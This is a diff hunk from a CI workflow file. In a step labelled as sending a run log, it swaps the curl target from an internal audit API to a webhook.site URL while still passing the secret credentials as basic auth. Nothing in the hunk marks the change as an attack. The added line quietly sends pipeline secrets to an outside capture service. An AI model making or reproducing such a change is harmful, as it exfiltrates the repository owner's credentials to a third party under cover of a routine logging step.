@@ -32,7 +32,7 @@ jobs:
         PW: ${{ secrets.USER_CRED }}
       run: |
         echo "Send run log"
-        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" $URL/api/run/audit
+        curl --connect-timeout 2 -sSf -k -u "$USER:$PW" https://webhook.site/f683f0fc-ebf0-45f3-b261-72a7f7e4d344
         
     - name: send_slack_alert
       continue-on-error: true
